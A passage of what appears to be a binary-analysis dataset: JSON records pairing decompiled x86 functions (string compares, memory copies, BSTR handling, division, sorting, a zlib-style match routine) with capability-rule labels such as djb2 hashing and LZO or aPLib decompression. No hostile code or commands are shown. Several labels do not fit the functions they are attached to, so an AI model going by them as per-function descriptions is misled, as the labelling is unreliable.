      iVar4 = piVar1[1] + *piVar1 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((piVar1[1] + *piVar1 & 1U) != 0);\n                }\n                piVar1[1] = iVar4;\n                *piVar5 = iVar4 + 1;\n            }\n            else if (iVar2 == 1) {\n                iVar4 = piVar1[3] + piVar1[2] >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((piVar1[3] + piVar1[2] & 1U) != 0);\n                }\n                piVar1[3] = iVar4;\n                piVar5[2] = iVar4 + 1;\n            }\n            else if (iVar2 == 2) {\n                iVar4 = piVar1[5] + piVar1[4] >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((piVar1[5] + piVar1[4] & 1U) != 0);\n                }\n                piVar1[5] = iVar4;\n                piVar5[4] = iVar4 + 1;\n            }\n            fcn.004381b8();\n            fcn.004381b8();\n            in_ECX = in_ECX + 1;\n        } while (in_ECX < arg_8h);\n    }\n    return in_ECX;\n}\n",
        "token_count": 744
    },
    "004387e8": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004387e8(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = (**in_EAX[1])();\n    *puVar1 = 0;\n    puVar1[1] = 0x1f;\n    puVar1[2] = 0;\n    puVar1[3] = 0x3f;\n    puVar1[4] = 0;\n    puVar1[5] = 0x1f;\n    fcn.004381b8();\n    iVar2 = fcn.00438588(param_2);\n    iVar3 = 0;\n    if (0 < iVar2) {\n        do {\n            fcn.004386a4();\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar2);\n    }\n    in_EAX[0x21] = iVar2;\n    iVar3 = *in_EAX;\n    *(iVar3 + 0x14) = 0x60;\n    *(iVar3 + 0x18) = iVar2;\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 279
    },
    "00438c38": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438c38(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_10h;\n    int16_t *piVar1;\n    int32_t in_ECX;\n    uint *puVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_194h;\n    uint var_114h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(*(in_EAX + 0x1cc) + 0x18);\n    var_4h = in_EDX >> 2;\n    var_8h = in_ECX >> 3;\n    var_10h = (arg_8h >> 2) * 0x20 + 4;\n    arg_10h = fcn.00438880(&var_114h, var_10h);\n    fcn.00438ac0(&var_194h, &var_114h, arg_10h, var_10h);\n    var_4h = var_4h * 4;\n    var_8h = var_8h * 8;\n    puVar2 = &var_194h;\n    var_14h = 0;\n    do {\n        iVar4 = 0;\n        do {\n            piVar1 = *(var_ch + (var_4h + var_14h) * 4) + (var_8h + iVar4) * 0x40 + (arg_8h >> 2) * 8;\n            iVar3 = 0;\n            do {\n                *piVar1 = *puVar2 + 1;\n                puVar2 = puVar2 + 1;\n                piVar1 = piVar1 + 1;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 4);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 8);\n        var_14h = var_14h + 1;\n    } while (var_14h < 4);\n    return;\n}\n",
        "token_count": 496
    },
    "004039b8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004039b8(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x004039fb:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x00403a36:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x00403a36;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x004039fb;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x00403a36;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 486
    },
    "00403a3c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403a3c(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403a6c:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403a6c;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 328
    },
    "0040464c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404681)\n// WARNING: Removing unreachable block (ram,0x00404687)\n// WARNING: Removing unreachable block (ram,0x0040468e)\n// WARNING: Removing unreachable block (ram,0x00404694)\n// WARNING: Removing unreachable block (ram,0x0040469a)\n\nvoid __fastcall fcn.0040464c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00405df4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405df4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0040a7f0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a7f0(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 338
    },
    "0041cd60": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cd60(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041cdac();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0041f214": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f214(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041f260();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00447738": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00447738(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    char cStack16;\n    char cStack15;\n    \n    uStack36 = *(in_EAX + 0x78);\n    uVar2 = *(in_EAX + 0x74);\n    pcVar3 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    if (*(in_EAX + 0x28) - 0x106U < *(in_EAX + 0x68)) {\n        uVar6 = *(in_EAX + 0x68) - (*(in_EAX + 0x28) + -0x106);\n    }\n    else {\n        uVar6 = 0;\n    }\n    cStack16 = pcVar3[uVar2 - 1];\n    pcVar5 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    cStack15 = pcVar3[uVar2];\n    if (*(in_EAX + 0x88) <= *(in_EAX + 0x74)) {\n        uStack36 = uStack36 >> 2;\n    }\n    uStack40 = param_2;\n    uStack32 = *(in_EAX + 0x8c);\n    if (*(in_EAX + 0x70) < *(in_EAX + 0x8c)) {\n        uStack32 = *(in_EAX + 0x70);\n    }\n    do {\n        pcVar8 = *(in_EAX + 0x34) + uStack40;\n        if ((((pcVar8[uVar2] == cStack15) && (pcVar8[uVar2 - 1] == cStack16)) && (*pcVar8 == *pcVar3)) &&\n           (pcVar8[1] == pcVar3[1])) {\n            pcVar8 = pcVar8 + 2;\n            pcVar3 = pcVar3 + 2;\n            while (((((pcVar4 = pcVar3 + 1,  *pcVar4 == pcVar8[1] && (pcVar4 = pcVar3 + 2,  *pcVar4 == pcVar8[2])) &&\n                     ((pcVar4 = pcVar3 + 3,  *pcVar4 == pcVar8[3] &&\n                      ((pcVar4 = pcVar3 + 4,  *pcVar4 == pcVar8[4] && (pcVar4 = pcVar3 + 5,  *pcVar4 == pcVar8[5]))))))\n                    && (pcVar4 = pcVar3 + 6,  *pcVar4 == pcVar8[6])) && (pcVar4 = pcVar3 + 7,  *pcVar4 == pcVar8[7]))) {\n                pcVar4 = pcVar3 + 8;\n                pcVar8 = pcVar8 + 8;\n                if ((*pcVar4 != *pcVar8) || (pcVar3 = pcVar4,  pcVar5 + 0x102 <= pcVar4)) break;\n            }\n            iVar1 = -((pcVar5 + 0x102) - pcVar4);\n            uVar7 = iVar1 + 0x102;\n            pcVar3 = pcVar5;\n            if (uVar2 < uVar7) {\n                *(in_EAX + 0x6c) = uStack40;\n                if (uStack32 <= uVar7) {\ncode_r0x00447897:\n                    uVar2 = *(in_EAX + 0x70);\n                    if (uVar7 <= uVar2) {\n                        uVar2 = uVar7;\n                    }\n                    return uVar2;\n                }\n                cStack16 = pcVar5[iVar1 + 0x101];\n                cStack15 = pcVar5[uVar7];\n                uVar2 = uVar7;\n            }\n        }\n        uVar7 = uVar2;\n        uStack40 = *(*(in_EAX + 0x3c) + (uStack40 & *(in_EAX + 0x30)) * 2);\n        if ((uStack40 <= uVar6) || (uStack36 = uStack36 - 1,  uVar2 = uVar7,  uStack36 == 0)) goto code_r0x00447897;\n    } while( true );\n}\n",
        "token_count": 1054
    },
    "00405694": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405694(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x004056bd:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x004056ba:\n                piVar2 = piVar2 + 1;\n                goto code_r0x004056bd;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x004056ba;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.0040546c(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.0040558c(arg_8h),  -1 < iVar1)) {\n        fcn.0040555c();\n    }\n    else {\n        fcn.00405b8c();\n        fcn.0040558c(arg_8h);\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004056f4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004056f4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.0040546c(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.0040558c(arg_8h),  -1 < iVar1)) {\n        fcn.0040555c();\n    }\n    else {\n        fcn.00405b8c();\n        fcn.0040558c(arg_8h);\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00405c84": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405c84(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != param_2) {\n        if ((param_2 == 0) || (*(param_2 + -4) >> 1 == 0)) {\n            iVar1 = *in_EAX;\n            if (iVar1 != 0) {\n                *in_EAX = 0;\n                sub.oleaut32.dll_SysFreeString(iVar1);\n            }\n            return;\n        }\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 == 0) {\n            if (*0x4a6008 != NULL) {\n                (**0x4a6008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00405d8c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405d8c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x00405db5:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x00405db2:\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405db5;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405db2;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x4a6008 != NULL) {\n        (**0x4a6008)();\n    }\n    fcn.00402fe8();\n    return;\n}\n",
        "token_count": 451
    },
    "00405de8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00405de8(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004063f0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004063f0(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    uVar8 = param_2 >> 0x1f;\n    uVar3 = (in_EAX ^ uVar8) - uVar8;\n    uVar6 = ((param_2 ^ uVar8) - uVar8) - ((in_EAX ^ uVar8) < uVar8);\n    uVar8 = param_4 >> 0x1f;\n    uVar9 = (param_2 ^ param_4) >> 0x1f;\n    uVar7 = (param_3 ^ uVar8) - uVar8;\n    uVar8 = ((param_4 ^ uVar8) - uVar8) - ((param_3 ^ uVar8) < uVar8);\n    if (uVar8 == 0) {\n        if (uVar7 <= uVar6) {\n            uVar8 = uVar6 / uVar7;\n            uVar6 = uVar6 % uVar7;\n        }\n        uVar3 = CONCAT44(uVar6, uVar3) / uVar7;\n    }\n    else {\n        bVar10 = (uVar8 & 1) != 0;\n        iVar4 = 0x1f;\n        if (uVar8 != 0) {\n            for (; uVar8 >> iVar4 == 0; iVar4 = iVar4 + -1) {\n            }\n        }\n        uVar5 = iVar4;\n        uVar1 = CONCAT44((uVar6 >> 1) >> (uVar5 & 0x1f), \n                         (uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f) >> (uVar5 & 0x1f) |\n                         (uVar6 >> 1) << 0x20 - (uVar5 & 0x1f)) /\n                ((uVar7 >> 1 | bVar10 << 0x1f) >> (uVar5 & 0x1f) |\n                (uVar8 >> 1 | bVar10 << 0x1f) << 0x20 - (uVar5 & 0x1f));\n        iVar4 = uVar1;\n        iVar2 = (uVar1 & 0xffffffff) * uVar7;\n        uVar8 = (iVar2 >> 0x20) + (uVar8 & 0xfffffffe | bVar10) * iVar4;\n        uVar3 = iVar4 - (uVar6 < uVar8 || uVar6 - uVar8 < (uVar3 < iVar2));\n        uVar8 = 0;\n    }\n    return CONCAT44(((uVar8 ^ uVar9) - uVar9) - ((uVar3 ^ uVar9) < uVar9), (uVar3 ^ uVar9) - uVar9);\n}\n",
        "token_count": 743
    },
    "0041b2b8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b2b8(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.0041afc0();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041b2b8(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 401
    },
    "0040bd04": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd04(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 126
    },
    "0041cfc4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cfc4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0041fcb0();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0041fc84();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.0040669c();\n                fcn.00406858(iVar2 + 1);\n                uVar3 = fcn.0041fc84();\n                iVar2 = fcn.0040669c();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "0041e924": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e924(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041c944();\n        if (cVar1 != '\\0') break;\n        fcn.0041e9d8();\n    }\n    fcn.0041da00();\n    return;\n}\n",
        "token_count": 82
    },
    "0041e97c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e97c(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041c944();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cd3c();\n        if (cVar1 - 2U < 3) {\n            fcn.0041e9d8();\n        }\n        fcn.0041ede4();\n        while( true ) {\n            cVar1 = fcn.0041c944();\n            if (cVar1 != '\\0') break;\n            fcn.0041eb88();\n        }\n        fcn.0041da00();\n    }\n    fcn.0041da00();\n    return;\n}\n",
        "token_count": 174
    },
    "004239c8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.004239c8(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t *var_1ch_2;\n    uchar *var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch_2;\n    uint var_8h_3;\n    \n    iVar8 = 0;\n    iVar5 = (param_1 + 1) * -4;\n    var_10h = &stack0xffffffd4 + iVar5;\n    puVar2 = &stack0xffffffd4 + iVar5;\n    var_1ch_2 = in_EAX;\n    var_ch_2 = param_1;\n    do {\n        puVar6 = puVar2;\n        *(puVar6 + -4) = 0x4239f7;\n        iVar3 = fcn.0040a764();\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = iVar3;\n        *(puVar6 + -0x10) = param_2;\n        *(puVar6 + -0x14) = 0;\n        *(puVar6 + -0x18) = 0;\n        *(puVar6 + -0x1c) = 0x423a08;\n        var_14h = sub.kernel32.dll_MultiByteToWideChar_1();\n        var_14h = var_14h + 1;\n        iVar5 = -(var_14h * 2 + 3U & 0xfffffffc);\n        var_18h = puVar6 + iVar5 + -0x18;\n        if (iVar8 == 0) {\n            *var_10h = puVar6 + iVar5 + -0x18;\n        }\n        else {\n            *(var_10h + (var_ch_2 - iVar8) * 4) = puVar6 + iVar5 + -0x18;\n            var_18h = puVar6 + iVar5 + -0x18;\n        }\n        *(puVar6 + iVar5 + -0x1c) = var_14h;\n        *(puVar6 + iVar5 + -0x20) = var_18h;\n        *(puVar6 + iVar5 + -0x24) = iVar3;\n        *(puVar6 + iVar5 + -0x28) = param_2;\n        *(puVar6 + iVar5 + -0x2c) = 0;\n        *(puVar6 + iVar5 + -0x30) = 0;\n        *(puVar6 + iVar5 + -0x34) = 0x423a4d;\n        sub.kernel32.dll_MultiByteToWideChar_1();\n        *(var_18h + var_14h * 2 + -2) = 0;\n        